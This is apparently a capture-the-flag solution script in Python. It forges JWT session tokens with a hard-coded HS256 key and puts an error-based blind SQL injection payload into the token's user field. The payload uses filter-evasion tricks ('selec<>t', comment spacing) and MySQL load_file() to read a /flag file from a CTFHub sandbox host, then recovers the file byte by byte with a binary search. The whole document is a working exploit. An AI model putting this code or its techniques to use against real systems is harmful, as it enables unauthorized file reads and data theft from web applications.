#!/usr/bin/env python
# coding: utf-8
# hosch3n in 2020-05-25

import requests
# import string
# import time
# import re
import jwt

http_headers = {
    "User-Agent": "",
    "Cookie": ""
}

proxies = {
  "http": "http://127.0.0.1:8088",
}

# URL
url = "http://challenge-fdac267715d86e75.sandbox.ctfhub.com:10080/index.php"

# rqs = requests.session()
# rqs.post(url=url, headers=http_headers, proxies=proxies, data=http_data)

# 生成JWT
def rebuild(key, payload):
    tmp_token = {"user": payload}
    jwt_headers = {"alg":"HS256", "typ":"JWT"}
    jwt_token = jwt.encode(tmp_token, key, algorithm="HS256", headers=jwt_headers).decode('ascii')
    return jwt_token

def exploit(guess, median):
    payload_a = "selec<>t/**/load_file('/flag')"
    payload_b = f"admin'/**/and/**/if((asci<>i(subst<>r(({payload_a}),{guess},1))>{median}),(selec<>t+pow(9999,100)),1)#"
    key = "xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6"

    # 签名
    jwt_token = rebuild(key, payload_b)
    http_headers["Cookie"] = f"token={jwt_token}"

    # 发包
    result = requests.get(url, headers=http_headers)

    # 判断
    # if result.status_code == 500:
    if 'Fatal error' in result.text:
        return True
    else:
        return False

# 二分判断
def dichotomy(low, top):
    while (top - low > 1):
        median = (top + low) // 2
        tmp_bool = exploit(guess, median)
        if tmp_bool:
            low = median
        else:
            top = median
    return top

if __name__ == "__main__":
    # test_string = string.printable
    flag = ""

    # 60张牌你能秒我？
    for guess in range(60):
        tmp_ascii = dichotomy(31, 127)
        flag += chr(tmp_ascii)
        print(flag)